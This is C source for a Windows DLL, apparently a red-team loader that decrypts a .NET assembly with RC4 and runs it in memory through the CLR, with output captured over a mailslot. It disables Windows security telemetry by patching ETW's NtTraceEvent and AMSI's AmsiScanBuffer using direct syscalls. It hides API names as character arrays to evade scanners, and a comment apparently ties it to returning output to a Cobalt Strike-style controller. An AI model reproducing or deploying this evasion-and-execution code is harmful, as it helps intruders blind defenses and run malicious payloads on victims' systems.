#include <windows.h>
#include <stdio.h>
#include <wininet.h>
#include <stdlib.h>
#include <stdint.h>
#include "PatchedCLRLoaderDLL.h"
#include "syscalls_mem.h"
#pragma comment(lib, "mscoree.lib")

#pragma warning( disable:4996 )
#define DEFAULT_BUFLEN 4096

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;
} USTRING;


typedef NTSTATUS(NTAPI* fnSystemFunction032)(struct USTRING* Buffer, struct USTRING* Key);


BOOL Rc4EncryptionViaSystemFunc032(char* assemblyBytes, size_t assemblyByteLen, char* key, size_t keyLen) {

	NTSTATUS			STATUS = NULL;
	fnSystemFunction032 SystemFunction032 = NULL;
	USTRING				Buffer = { .Buffer = assemblyBytes,	.Length = assemblyByteLen,	.MaximumLength = assemblyByteLen };
	USTRING				Key = { .Buffer = key,		.Length = keyLen,		.MaximumLength = keyLen };
	char admod[] = { 'A', 'd', 'v', 'a', 'p', 'i', '3', '2', 0 };
	HINSTANCE hinst = LoadLibraryA(admod);
	if (hinst == NULL)
	{
		fprintf(stderr, "[-] Failed to load requried library\n");
		return;
	}


	char fcacw[] = { 'S','y','s','t','e','m','F','u','n','c','t','i','o','n','0','3','2', 0 };
	if (!(SystemFunction032 = (fnSystemFunction032)GetProcAddress(GetModuleHandleA(admod), fcacw)))
	{
		printf("[!] GetProcAddress SystemFunction032 Failed With Error: %d \n", GetLastError());
		return FALSE;
	}
	if ((STATUS = SystemFunction032(&Buffer, &Key)) != 0x0) {
		printf("[!] SystemFunction032 Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

BOOL IsReadable(DWORD protect, DWORD state) {
	if (!((protect & PAGE_READONLY) == PAGE_READONLY || (protect & PAGE_READWRITE) == PAGE_READWRITE || (protect & PAGE_EXECUTE_READWRITE) == PAGE_EXECUTE_READWRITE || (protect & PAGE_EXECUTE_READ) == PAGE_EXECUTE_READ)) {
		return FALSE;
	}

	if ((protect & PAGE_GUARD) == PAGE_GUARD) {
		return FALSE;
	}

	if ((state & MEM_COMMIT) != MEM_COMMIT) {
		return FALSE;
	}

	return TRUE;
}


BOOL PatchAMSI()
{
	char clrmod[] = { 'c','l','r','.','d','l','l',0 };
	char AMSISCANBUFFER[] = { 'A','m','s','i','S','c','a','n','B','u','f','f','e','r',0 };
	char zero[15] = { 0 };

	HANDLE ClrHandle = GetModuleHandleA(clrmod);
	MEMORY_BASIC_INFORMATION memInfo;
	BOOL status;
	HANDLE currentProcess = GetCurrentProcess();
	if (!ClrHandle)
	{
		printf("[+] Cannot get clr handle!");
		return FALSE;
	}
	LPVOID baseaddress = (uintptr_t)ClrHandle;
	while (VirtualQuery(baseaddress, &memInfo, sizeof(memInfo)))
	{
		size_t regionSize = memInfo.RegionSize;
		BYTE* temp = (BYTE*)malloc(regionSize);

		if (memInfo.Protect == PAGE_READONLY) {
			if (ReadProcessMemory(currentProcess, baseaddress, temp, sizeof(temp), NULL))
			{

				if (!IsReadable(memInfo.Protect, memInfo.State)) {
					continue;
				}
				for (int j = 0; j < memInfo.RegionSize - sizeof(unsigned char*); j++) {
					unsigned char* current = ((unsigned char*)memInfo.BaseAddress) + j;


					BOOL found = TRUE;
					for (int k = 0; k < sizeof(AMSISCANBUFFER); k++) {
						if (current[k] != AMSISCANBUFFER[k]) {
							found = FALSE;
							break;
						}
					}

					if (found) {
						LPVOID amsiscanbufferAddress = ((unsigned char*)memInfo.BaseAddress) + j;
						printf("[+] Found AmsiScanBuffer in %p", amsiscanbufferAddress);
						ULONG original;
						DWORD new = 0;
						status = Sw3NtProtectVirtualMemory(-1, &memInfo.BaseAddress, &memInfo.RegionSize, PAGE_EXECUTE_READWRITE, &original);
						if (status != 0)
						{
							printf("[-] Fail to modify AmsiScanBuffer memory permission to READWRITE. \n");
							return FALSE;
						}

						status = Sw3NtWriteVirtualMemory(-1, amsiscanbufferAddress, &zero, sizeof(AMSISCANBUFFER), NULL);
						if (status != 0)
						{
							printf("[-] Fail to patch AmsiScanBuffer. \n");
							return FALSE;
						}
						status = Sw3NtProtectVirtualMemory(-1, &memInfo.BaseAddress, &memInfo.RegionSize, original, &new);
						if (status != 0)
						{
							printf("[-] Fail to modify AmsiScanBuffer memory permission to original state. \n");
							return FALSE;
						}
						return TRUE;

					}
				}
			}

		}
		baseaddress = (LPVOID)((uintptr_t)baseaddress + regionSize);

	}
	return FALSE;
}

BOOL PatchETW()
{
	FARPROC ptrNtTraceEvent = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtTraceEvent");
	unsigned char etwPatch[] = { 0xC3 };
	ULONG OldProtection, NewProtection;
	SIZE_T uSize = sizeof(etwPatch);
	BOOL status;
	void* lpBaseAddress = ptrNtTraceEvent;
	printf("[+] Found ptrNtTraceEvent in %p", lpBaseAddress);


	status = Sw3NtProtectVirtualMemory(-1, (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_EXECUTE_READWRITE, &OldProtection);

	if (status != 0)
	{
		printf("[-] Failed to modify NtTraceEvent memory permission to READWRITE.\n");
		return FALSE;
	}


	status = Sw3NtWriteVirtualMemory(-1, ptrNtTraceEvent, (PVOID)etwPatch, sizeof(etwPatch), NULL);

	if (status != 0)
	{
		printf("[-] Failed to copy patch to NtTraceEvent.\n");
		return FALSE;
	}

	status = Sw3NtProtectVirtualMemory(-1, (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);

	if (status != 0)
	{
		printf("[-] Failed to modify NtTraceEvent memory permission to original state.\n");
		return FALSE;
	}
	return TRUE;
}

BOOL WINAPI MakeSlot(LPCSTR lpszSlotName, HANDLE* mailHandle)
{
	*mailHandle = CreateMailslotA(lpszSlotName,
		0,                             //No maximum message size 
		MAILSLOT_WAIT_FOREVER,         //No time-out for operations 
		(LPSECURITY_ATTRIBUTES)NULL);  //Default security

	if (*mailHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	else
		return TRUE;
}

/*Read Mailslot*/
BOOL ReadSlot(char* output, HANDLE* mailHandle)
{
	DWORD cbMessage = 0;
	DWORD cMessage = 0;
	DWORD cbRead = 0;
	BOOL fResult;
	LPSTR lpszBuffer = NULL;
	size_t size = 65535;
	char* achID = (char*)MALLOC(size);
	memset(achID, 0, size);
	DWORD cAllMessages = 0;
	HANDLE hEvent;
	OVERLAPPED ov;

	hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
	if (NULL == hEvent)
		return FALSE;
	ov.Offset = 0;
	ov.OffsetHigh = 0;
	ov.hEvent = hEvent;

	fResult = GetMailslotInfo(*mailHandle, //Mailslot handle 
		(LPDWORD)NULL,               //No maximum message size 
		&cbMessage,                  //Size of next message 
		&cMessage,                   //Number of messages 
		(LPDWORD)NULL);              //No read time-out 

	if (!fResult)
	{
		return FALSE;
	}

	if (cbMessage == MAILSLOT_NO_MESSAGE)
	{
		return TRUE;
	}

	cAllMessages = cMessage;
	while (cMessage != 0)  //Get all messages
	{
		//Allocate memory for the message. 
		lpszBuffer = (LPSTR)GlobalAlloc(GPTR, lstrlenA((LPSTR)achID) * sizeof(CHAR) + cbMessage);
		if (NULL == lpszBuffer)
			return FALSE;
		lpszBuffer[0] = '\0';

		fResult = ReadFile(*mailHandle,
			lpszBuffer,
			cbMessage,
			&cbRead,
			&ov);

		if (!fResult)
		{
			GlobalFree((HGLOBAL)lpszBuffer);
			return FALSE;
		}

		//Copy mailslot output to returnData buffer
		_snprintf(output + strlen(output), strlen(lpszBuffer) + 1, "%s", lpszBuffer);

		fResult = GetMailslotInfo(*mailHandle,  //Mailslot handle 
			(LPDWORD)NULL,               //No maximum message size 
			&cbMessage,                  //Size of next message 
			&cMessage,                   //Number of messages 
			(LPDWORD)NULL);              //No read time-out 

		if (!fResult)
		{
			return FALSE;
		}


	}


	cbMessage = 0;
	GlobalFree((HGLOBAL)lpszBuffer);
	char fch[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
	char k32mod[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3','2','.', 'd', 'l', 'l', 0 };
	_CloseHandle CloseHandle = (_CloseHandle)GetProcAddress(GetModuleHandleA(k32mod), fch);
	CloseHandle(hEvent);
	return TRUE;
}

/*Determine if .NET assembly is v4 or v2*/
BOOL FindVersion(void* assembly, int length) {
	char* assembly_c;
	assembly_c = (char*)assembly;
	char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };

	for (int i = 0; i < length; i++)
	{
		for (int j = 0; j < 10; j++)
		{
			if (v4[j] != assembly_c[i + j])
			{
				break;
			}
			else
			{
				if (j == (9))
				{
					return 1;
				}
			}
		}
	}

	return 0;
}

/*Start CLR*/
static BOOL StartCLR(LPCWSTR dotNetVersion, ICLRMetaHost** ppClrMetaHost, ICLRRuntimeInfo** ppClrRuntimeInfo, ICorRuntimeHost** ppICorRuntimeHost) {

	//Declare variables
	HRESULT hr = NULL;

	//Get the CLRMetaHost that tells us about .NET on this machine
	hr = CLRCreateInstance(&xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)ppClrMetaHost);

	if (hr == S_OK)
	{
		//Get the runtime information for the particular version of .NET
		hr = (*ppClrMetaHost)->lpVtbl->GetRuntime(*ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo);
		if (hr == S_OK)
		{
			/*Check if the specified runtime can be loaded into the process. This method will take into account other runtimes that may already be
			loaded into the process and set fLoadable to TRUE if this runtime can be loaded in an in-process side-by-side fashion.*/
			BOOL fLoadable;
			hr = (*ppClrRuntimeInfo)->lpVtbl->IsLoadable(*ppClrRuntimeInfo, &fLoadable);
			if ((hr == S_OK) && fLoadable)
			{
				//Load the CLR into the current process and return a runtime interface pointer. -> CLR changed to ICor which is deprecated but works
				hr = (*ppClrRuntimeInfo)->lpVtbl->GetInterface(*ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, (LPVOID*)ppICorRuntimeHost);
				if (hr == S_OK)
				{
					//Start it. This is okay to call even if the CLR is already running
					(*ppICorRuntimeHost)->lpVtbl->Start(*ppICorRuntimeHost);
				}
				else
				{
					//If CLR fails to load fail gracefully
					printf("[-] Process refusing to get interface of %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
					return 0;
				}
			}
			else
			{
				//If CLR fails to load fail gracefully
				printf("[-] Process refusing to load AppDomain of %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
				return 0;
			}
		}
		else
		{
			//If CLR fails to load fail gracefully
			printf("[-] The assembly is not correctly loaded. Please check your decryption key, \n[-] Or the Process refusing to load AppDomain of %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
			return 0;
		}
	}
	else
	{
		//If CLR fails to load fail gracefully
		printf("[-] The assembly is not correctly loaded. Please check your decryption key, \n[-] Or the Process refusing to load AppDomain of %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
		return 0;
	}

	//CLR loaded successfully
	return 1;
}

void Usage(char* lpProgram) {
	printf("Usage:\n");
	printf("\t%s <payload> <key> <arguments>\n", lpProgram);
}

	
int ExecuteDotNet() {
	char* appDomain = "nothinghere";
	char* assemblyArguments = " ";
	char* fileName = "";
	char* key = "DarklabHK";
	char* keybytes = "";
	size_t keysize = 0;
	BOOL amsi = 1;
	BOOL etw = 1;
	BOOL local = 0;
	ULONG entryPoint = 1;
	char* assemblyBytes = NULL;
	size_t assemblyByteLen = 0;
	char* slotName = "nothinghere";
	size_t bufferSize = 0;

	printf("[+] Please Input Shellcode File here!\n");
	custom_getline(&fileName, &bufferSize, stdin);
	if (strncmp(fileName, "http", 4) == 0)
	{
		local = 1;
	}
	printf("[+] Loading file %s\n", fileName);

	keysize = strlen(key);
	printf("[+] Loading key %s\n", key);
	printf("[+] Please Add your argument here! If no argument just simply press enter to pass.\n");
	bufferSize = 0;
	custom_getline(&assemblyArguments, &bufferSize, stdin);
	printf("[+] Arguments: %s\n", assemblyArguments);


	FILE* fp = fopen(fileName, "rb");
	if (fp != NULL)
	{
		fseek(fp, 0, SEEK_END);
		assemblyByteLen = ftell(fp);
		fseek(fp, 0, SEEK_SET);
		assemblyBytes = (char*)malloc(assemblyByteLen);
		fread(assemblyBytes, assemblyByteLen, 1, fp);
		Rc4EncryptionViaSystemFunc032(assemblyBytes, assemblyByteLen, key, keysize);
	}
	else
	{
		printf("[-] Failed to read file: %s\n", fileName);
		return;
	}


	//Create mailslot names	
	SIZE_T slotNameLen = strlen(slotName);
	char* slotPath = malloc(slotNameLen + 14);
	memset(slotPath, 0, slotNameLen + 14);
	memcpy(slotPath, "\\\\.\\mailslot\\", 13);
	memcpy(slotPath + 13, slotName, slotNameLen + 1);
	//Declare other variables
	HRESULT hr = NULL;
	ICLRMetaHost* pClrMetaHost = NULL;//done
	ICLRRuntimeInfo* pClrRuntimeInfo = NULL;//done
	ICorRuntimeHost* pICorRuntimeHost = NULL;
	IUnknown* pAppDomainThunk = NULL;
	AppDomain* pAppDomain = NULL;
	Assembly* pAssembly = NULL;
	MethodInfo* pMethodInfo = NULL;
	VARIANT vtPsa = { 0 };
	SAFEARRAYBOUND rgsabound[1] = { 0 };
	wchar_t* wAssemblyArguments = NULL;
	wchar_t* wAppDomain = NULL;
	wchar_t* wNetVersion = NULL;
	LPWSTR* argumentsArray = NULL;
	int argumentCount = 0;
	HANDLE stdOutput;
	HANDLE mainHandle;
	HANDLE hFile;
	size_t wideSize = 0;
	size_t wideSize2 = 0;
	BOOL success = 1;
	size_t size = 65535;
	char* returnData = (char*)MALLOC(size);
	memset(returnData, 0, size);



	//Determine .NET assemblie version
	if (FindVersion((void*)assemblyBytes, assemblyByteLen))
	{
		wNetVersion = L"v4.0.30319";
	}
	else
	{
		wNetVersion = L"v2.0.50727";
	}

	//Convert assemblyArguments to wide string wAssemblyArguments to pass to loaded .NET assmebly
	size_t convertedChars = 0;
	wideSize = strlen(assemblyArguments) + 1;
	wAssemblyArguments = (wchar_t*)malloc(wideSize * sizeof(wchar_t));
	mbstowcs_s(&convertedChars, wAssemblyArguments, wideSize, assemblyArguments, _TRUNCATE);

	//Convert appDomain to wide string wAppDomain to pass to CreateDomain
	size_t convertedChars2 = 0;
	wideSize2 = strlen(appDomain) + 1;
	wAppDomain = (wchar_t*)malloc(wideSize2 * sizeof(wchar_t));
	mbstowcs_s(&convertedChars2, wAppDomain, wideSize2, appDomain, _TRUNCATE);

	//Get an array of arguments so arugements can be passed to .NET assembly
	argumentsArray = CommandLineToArgvW(wAssemblyArguments, &argumentCount);

	//Create an array of strings that will be used to hold our arguments -> needed for Main(String[] args)
	vtPsa.vt = (VT_ARRAY | VT_BSTR);
	vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, argumentCount);

	for (long i = 0; i < argumentCount; i++)
	{
		//Insert the string from argumentsArray[i] into the safearray
		SafeArrayPutElement(vtPsa.parray, &i, SysAllocString(argumentsArray[i]));
	}


	/// patching etw
	printf("[+] Patching ETW!\n");

	PatchETW();


	//printf("GetCurrentThreadId: %lu\n", GetCurrentThreadId());
	//printf("etwPatchAddr: %u\n", etwPatchAddr);


	//Start CLR
	printf("[+] Start loading assembly! Please wait for the ouput.\n");
	success = StartCLR((LPCWSTR)wNetVersion, &pClrMetaHost, &pClrRuntimeInfo, &pICorRuntimeHost);

	//If starting CLR fails exit gracefully
	if (success != 1) {
		return;
	}

	//Create Mailslot
	success = MakeSlot(slotPath, &mainHandle);

	char k32mod[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3','2','.', 'd', 'l', 'l', 0 };
	//Get a handle to our pipe or mailslot
	char fcfa[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0 };
	_CreateFileA CreateFileA = (_CreateFileA)GetProcAddress(GetModuleHandleA(k32mod), fcfa);
	hFile = CreateFileA(slotPath, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);

	char fgsh[] = { 'G', 'e', 't', 'S', 't', 'd', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
	//Get current stdout handle so we can revert stdout after we finish
	_GetStdHandle GetStdHandle = (_GetStdHandle)GetProcAddress(GetModuleHandleA(k32mod), fgsh);
	stdOutput = GetStdHandle(((DWORD)-11));

	//Set stdout to our newly created named pipe or mail slot
	char fssh[] = { 'S', 'e', 't', 'S', 't', 'd', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
	_SetStdHandle SetStdHandle = (_SetStdHandle)GetProcAddress(GetModuleHandleA(k32mod), fssh);
	success = SetStdHandle(((DWORD)-11), hFile);

	//Create our AppDomain
	hr = pICorRuntimeHost->lpVtbl->CreateDomain(pICorRuntimeHost, (LPCWSTR)wAppDomain, NULL, &pAppDomainThunk);
	hr = pAppDomainThunk->lpVtbl->QueryInterface(pAppDomainThunk, &xIID_AppDomain, (VOID**)&pAppDomain);



	//patching CLR 
	printf("[+] Patching AMSI!\n");
	PatchAMSI();
	//printf("GetCurrentThreadId: %lu\n", GetCurrentThreadId());
	//printf("amsiPatchAddr: %u\n", amsiPatchAddr);

	//Prep SafeArray 
	rgsabound[0].cElements = assemblyByteLen;
	rgsabound[0].lLbound = 0;
	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
	void* pvData = NULL;
	hr = SafeArrayAccessData(pSafeArray, &pvData);

	//Copy our assembly bytes to pvData
	memcpy(pvData, assemblyBytes, assemblyByteLen);

	hr = SafeArrayUnaccessData(pSafeArray);

	//Prep AppDomain and EntryPoint
	hr = pAppDomain->lpVtbl->Load_3(pAppDomain, pSafeArray, &pAssembly);
	if (hr != S_OK) {
		//If AppDomain fails to load fail gracefully
		printf("[-] Process refusing to load AppDomain of %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", wNetVersion);
		return;
	}

	hr = pAssembly->lpVtbl->EntryPoint(pAssembly, &pMethodInfo);
	if (hr != S_OK) {
		//If EntryPoint fails to load fail gracefully
		printf("[-] Process refusing to find entry point of assembly.\n");
		return;
	}

	VARIANT retVal;
	ZeroMemory(&retVal, sizeof(VARIANT));
	VARIANT obj;
	ZeroMemory(&obj, sizeof(VARIANT));
	obj.vt = VT_NULL;

	//Change cElement to the number of Main arguments
	SAFEARRAY* psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, (ULONG)entryPoint);//Last field -> entryPoint == 1 is needed if Main(String[] args) 0 if Main()

	//Insert an array of BSTR into the VT_VARIANT psaStaticMethodArgs array
	long idx[1] = { 0 };
	SafeArrayPutElement(psaStaticMethodArgs, idx, &vtPsa);

	//Invoke our .NET Method
	hr = pMethodInfo->lpVtbl->Invoke_3(pMethodInfo, obj, psaStaticMethodArgs, &retVal);


	//Read from our mailslot

	success = ReadSlot(returnData, &mainHandle);


	//Send .NET assembly output back to CS
	printf("\n\n%s\n", returnData);


	//Close handles
	char fch[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
	_CloseHandle CloseHandle = (_CloseHandle)GetProcAddress(GetModuleHandleA(k32mod), fch);
	CloseHandle(mainHandle);
	CloseHandle(hFile);

	//Revert stdout back to original handles
	success = SetStdHandle(((DWORD)-11), stdOutput);

	//Clean up

	//getchar();
	SafeArrayDestroy(pSafeArray);
	VariantClear(&retVal);
	VariantClear(&obj);
	VariantClear(&vtPsa);

	if (NULL != psaStaticMethodArgs) {
		SafeArrayDestroy(psaStaticMethodArgs);

		psaStaticMethodArgs = NULL;
	}
	if (pMethodInfo != NULL) {

		pMethodInfo->lpVtbl->Release(pMethodInfo);
		pMethodInfo = NULL;
	}
	if (pAssembly != NULL) {

		pAssembly->lpVtbl->Release(pAssembly);
		pAssembly = NULL;
	}
	if (pAppDomain != NULL) {

		pAppDomain->lpVtbl->Release(pAppDomain);
		pAppDomain = NULL;
	}
	if (pAppDomainThunk != NULL) {

		pAppDomainThunk->lpVtbl->Release(pAppDomainThunk);
	}
	if (pICorRuntimeHost != NULL)
	{
		(pICorRuntimeHost)->lpVtbl->UnloadDomain(pICorRuntimeHost, pAppDomainThunk);
		(pICorRuntimeHost) = NULL;
	}
	if (pClrRuntimeInfo != NULL)
	{
		(pClrRuntimeInfo)->lpVtbl->Release(pClrRuntimeInfo);
		(pClrRuntimeInfo) = NULL;
	}
	if (pClrMetaHost != NULL)
	{
		(pClrMetaHost)->lpVtbl->Release(pClrMetaHost);
		(pClrMetaHost) = NULL;
	}
}
extern __declspec(dllexport) PVOID xxxxxx() {
	ExecuteDotNet();
	return NULL;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    return TRUE;
}

